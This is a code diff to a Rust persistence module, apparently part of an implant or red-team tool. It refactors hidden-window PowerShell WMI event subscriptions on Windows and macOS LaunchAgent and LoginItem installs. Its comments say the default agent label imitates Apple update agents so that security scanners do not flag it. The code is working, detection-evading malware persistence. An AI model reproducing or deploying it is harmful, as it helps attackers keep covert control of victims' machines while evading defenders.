@@ -215,19 +215,17 @@ pub mod windows {
                     "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
                 );
                 let ps_cmd = format!(
-                    r#"powershell -NonInteractive -WindowStyle Hidden -Command "
-                    $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{{Name='{}';EventNamespace='root/cimv2';QueryLanguage='WQL';Query='{}'}};
-                    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{{Name='{}';CommandLineTemplate='{}'}};
-                    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{{Filter=$filter;Consumer=$consumer}}"
-                "#,
+                    "$filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments @{{Name='{}';EventNamespace='root/cimv2';QueryLanguage='WQL';Query='{}'}};
+                    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments @{{Name='{}';CommandLineTemplate='{}'}};
+                    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments @{{Filter=$filter;Consumer=$consumer}}",
                     escaped_subscription_name,
                     filter_query,
                     escaped_subscription_name,
                     escaped_exe_path
                 );
 
-                let status = std::process::Command::new("cmd")
-                    .args(["/C", &ps_cmd])
+                let status = std::process::Command::new("powershell")
+                    .args(["-NonInteractive", "-WindowStyle", "Hidden", "-Command", &ps_cmd])
                     .status()
                     .map_err(|e| anyhow!("WmiSubscription: failed to spawn powershell: {}", e))?;
 
@@ -490,6 +488,10 @@ pub mod macos {
     /// with legitimate Apple software update agents; callers may override it.
     pub struct LaunchAgent {
         pub label: String,
+        /// When `true`, uses `launchctl asuser <uid> launchctl bootstrap/bootout`
+        /// for GUI-session bootstrap (LoginItem behaviour).
+        /// When `false` (default), uses direct `launchctl bootstrap gui/<uid>`.
+        pub asuser_bootstrap: bool,
     }
 
     impl Default for LaunchAgent {
@@ -498,6 +500,7 @@ pub mod macos {
             // which security scanners do not flag on sight.
             Self {
                 label: "com.apple.xpc.system-updater".to_string(),
+                asuser_bootstrap: false,
             }
         }
     }
@@ -542,20 +545,50 @@ pub mod macos {
             #[cfg(target_os = "macos")]
             {
                 let uid = unsafe { libc::getuid() };
-                let status = std::process::Command::new("launchctl")
-                    .args([
-                        "bootstrap",
-                        &format!("gui/{}", uid),
-                        &plist_path.to_string_lossy(),
-                    ])
-                    .status()
-                    .map_err(|e| anyhow!("LaunchAgent::install: launchctl: {}", e))?;
-                if !status.success() {
-                    // launchctl bootstrap returns 37 (ESRCH) when the service
-                    // is already loaded; treat that as a non-fatal warning.
-                    log::warn!(
-                        "LaunchAgent::install: launchctl bootstrap returned non-zero (service may already be loaded)"
-                    );
+                let uid_str = uid.to_string();
+                let gui_domain = format!("gui/{uid}");
+                if self.asuser_bootstrap {
+                    // GUI-session bootstrap via launchctl asuser (LoginItem pattern).
+                    let _ = std::process::Command::new("launchctl")
+                        .arg("asuser").arg(&uid_str)
+                        .arg("launchctl").arg("bootout")
+                        .arg(&gui_domain).arg(&plist_path)
+                        .status();
+                    let bootstrap = std::process::Command::new("launchctl")
+                        .arg("asuser").arg(&uid_str)
+                        .arg("launchctl").arg("bootstrap")
+                        .arg(&gui_domain).arg(&plist_path)
+                        .output()
+                        .map_err(|e| anyhow!("LaunchAgent::install: launchctl asuser bootstrap: {}", e))?;
+                    if !bootstrap.status.success() {
+                        let stderr = String::from_utf8_lossy(&bootstrap.stderr).trim().to_string();
+                        let detail = if stderr.is_empty() {
+                            "no stderr output".to_string()
+                        } else {
+                            stderr
+                        };
+                        return Err(anyhow!(
+                            "LaunchAgent::install: failed to bootstrap '{}' via launchctl asuser: {}",
+                            plist_path.display(),
+                            detail
+                        ));
+                    }
+                } else {
+                    let status = std::process::Command::new("launchctl")
+                        .args([
+                            "bootstrap",
+                            &gui_domain,
+                            &plist_path.to_string_lossy(),
+                        ])
+                        .status()
+                        .map_err(|e| anyhow!("LaunchAgent::install: launchctl: {}", e))?;
+                    if !status.success() {
+                        // launchctl bootstrap returns 37 (ESRCH) when the service
+                        // is already loaded; treat that as a non-fatal warning.
+                        log::warn!(
+                            "LaunchAgent::install: launchctl bootstrap returned non-zero (service may already be loaded)"
+                        );
+                    }
                 }
             }
             #[cfg(not(target_os = "macos"))]
@@ -578,13 +611,19 @@ pub mod macos {
             #[cfg(target_os = "macos")]
             {
                 let uid = unsafe { libc::getuid() };
-                let _ = std::process::Command::new("launchctl")
-                    .args([
-                        "bootout",
-                        &format!("gui/{}", uid),
-                        &plist_path.to_string_lossy(),
-                    ])
-                    .status();
+                let uid_str = uid.to_string();
+                let gui_domain = format!("gui/{uid}");
+                if self.asuser_bootstrap {
+                    let _ = std::process::Command::new("launchctl")
+                        .arg("asuser").arg(&uid_str)
+                        .arg("launchctl").arg("bootout")
+                        .arg(&gui_domain).arg(&plist_path)
+                        .status();
+                } else {
+                    let _ = std::process::Command::new("launchctl")
+                        .args(["bootout", &gui_domain, &plist_path.to_string_lossy()])
+                        .status();
+                }
             }
             #[cfg(not(target_os = "macos"))]
             let _ = std::process::Command::new("launchctl")
@@ -600,7 +639,24 @@ pub mod macos {
                 Some(h) => h.join("Library/LaunchAgents"),
                 None => return Ok(false),
             };
-            Ok(agents_dir.join(format!("{}.plist", self.label)).exists())
+            let plist_path = agents_dir.join(format!("{}.plist", self.label));
+            if !plist_path.exists() {
+                return Ok(false);
+            }
+            if self.asuser_bootstrap {
+                let uid = unsafe { libc::getuid() };
+                let service = format!("gui/{}/{}", uid, self.label);
+                let status = std::process::Command::new("launchctl")
+                    .arg("asuser")
+                    .arg(uid.to_string())
+                    .arg("launchctl")
+                    .arg("print")
+                    .arg(&service)
+                    .status()
+                    .map_err(|e| anyhow!("LaunchAgent::verify: launchctl asuser print: {}", e))?;
+                return Ok(status.success());
+            }
+            Ok(true)
         }
     }
 
@@ -792,6 +848,10 @@ pub mod macos {
     // ── 5.1: LoginItems ───────────────────────────────────────────────────────
 
     /// LoginItems persistence via a GUI-session LaunchAgent bootstrap.
+    ///
+    /// Thin wrapper around [`LaunchAgent`] with `asuser_bootstrap: true`.
+    /// The `app_name` drives the plist label; all persistence logic is
+    /// delegated to `LaunchAgent`.
     pub struct LoginItem {
         pub app_name: String,
     }
@@ -805,158 +865,28 @@ pub mod macos {
     }
 
     impl LoginItem {
-        fn label(&self) -> String {
-            format!(
-                "com.{}.helper",
-                self.app_name.to_ascii_lowercase().replace(' ', "-")
-            )
-        }
-
-        fn plist_path(&self) -> Result<PathBuf> {
-            let home = dirs::home_dir().ok_or_else(|| anyhow!("LoginItem: no home dir"))?;
-            Ok(home
-                .join("Library/LaunchAgents")
-                .join(format!("{}.plist", self.label())))
+        fn as_launch_agent(&self) -> LaunchAgent {
+            LaunchAgent {
+                label: format!(
+                    "com.{}.helper",
+                    self.app_name.to_ascii_lowercase().replace(' ', "-")
+                ),
+                asuser_bootstrap: true,
+            }
         }
     }
 
     impl Persist for LoginItem {
         fn install(&self, executable_path: &PathBuf) -> Result<()> {
-            let label = self.label();
-            let plist = format!(
-                r#"<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>{label}</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>{exe}</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-    <key>KeepAlive</key>
-    <true/>
-    <key>StandardOutPath</key>
-    <string>/dev/null</string>
-    <key>StandardErrorPath</key>
-    <string>/dev/null</string>
-</dict>
-</plist>"#,
-                label = label,
-                exe = executable_path.display()
-            );
-
-            let plist_path = self.plist_path()?;
-            let agents_dir = plist_path
-                .parent()
-                .ok_or_else(|| anyhow!("LoginItem::install: invalid plist path"))?;
-            std::fs::create_dir_all(agents_dir)
-                .map_err(|e| anyhow!("LoginItem::install: mkdir failed: {}", e))?;
-            std::fs::write(&plist_path, plist)
-                .map_err(|e| anyhow!("LoginItem::install: write failed: {}", e))?;
-
-            // SMLoginItemSetEnabled requires an app bundle helper in
-            // Contents/Library/LoginItems. For a standalone binary, use a
-            // user LaunchAgent and explicitly bootstrap it in the GUI session
-            // via `launchctl asuser`.
-            let uid = unsafe { libc::getuid() };
-            let uid_str = uid.to_string();
-            let gui_domain = format!("gui/{uid}");
-
-            // Best effort: remove any stale loaded instance so bootstrap does
-            // not fail due to an existing job.
-            let _ = std::process::Command::new("launchctl")
-                .arg("asuser")
-                .arg(&uid_str)
-                .arg("launchctl")
-                .arg("bootout")
-                .arg(&gui_domain)
-                .arg(&plist_path)
-                .status();
-
-            let bootstrap = std::process::Command::new("launchctl")
-                .arg("asuser")
-                .arg(&uid_str)
-                .arg("launchctl")
-                .arg("bootstrap")
-                .arg(&gui_domain)
-                .arg(&plist_path)
-                .output()
-                .map_err(|e| anyhow!("LoginItem::install: launchctl asuser bootstrap: {}", e))?;
-            if !bootstrap.status.success() {
-                let stderr = String::from_utf8_lossy(&bootstrap.stderr).trim().to_string();
-                let detail = if stderr.is_empty() {
-                    "no stderr output".to_string()
-                } else {
-                    stderr
-                };
-                return Err(anyhow!(
-                    "LoginItem::install: failed to bootstrap '{}' into {} via launchctl asuser: {}",
-                    plist_path.display(),
-                    gui_domain,
-                    detail
-                ));
-            }
-
-            log::info!(
-                "LoginItem::install: bootstrapped '{}' in {} via launchctl asuser",
-                plist_path.display(),
-                gui_domain
-            );
-            Ok(())
+            self.as_launch_agent().install(executable_path)
         }
 
         fn remove(&self) -> Result<()> {
-            let plist_path = match self.plist_path() {
-                Ok(p) => p,
-                Err(_) => return Ok(()),
-            };
-
-            let uid = unsafe { libc::getuid() };
-            let uid_str = uid.to_string();
-            let gui_domain = format!("gui/{uid}");
-
-            let _ = std::process::Command::new("launchctl")
-                .arg("asuser")
-                .arg(&uid_str)
-                .arg("launchctl")
-                .arg("bootout")
-                .arg(&gui_domain)
-                .arg(&plist_path)
-                .status();
-            let _ = std::fs::remove_file(&plist_path);
-
-            log::info!(
-                "LoginItem::remove: removed '{}' from {}",
-                self.label(),
-                gui_domain
-            );
-            Ok(())
+            self.as_launch_agent().remove()
         }
 
         fn verify(&self) -> Result<bool> {
-            let plist_path = match self.plist_path() {
-                Ok(p) => p,
-                Err(_) => return Ok(false),
-            };
-            if !plist_path.exists() {
-                return Ok(false);
-            }
-
-            let uid = unsafe { libc::getuid() };
-            let service = format!("gui/{}/{}", uid, self.label());
-            let status = std::process::Command::new("launchctl")
-                .arg("asuser")
-                .arg(uid.to_string())
-                .arg("launchctl")
-                .arg("print")
-                .arg(&service)
-                .status()
-                .map_err(|e| anyhow!("LoginItem::verify: launchctl asuser print: {}", e))?;
-
-            Ok(status.success())
+            self.as_launch_agent().verify()
         }
     }
 }
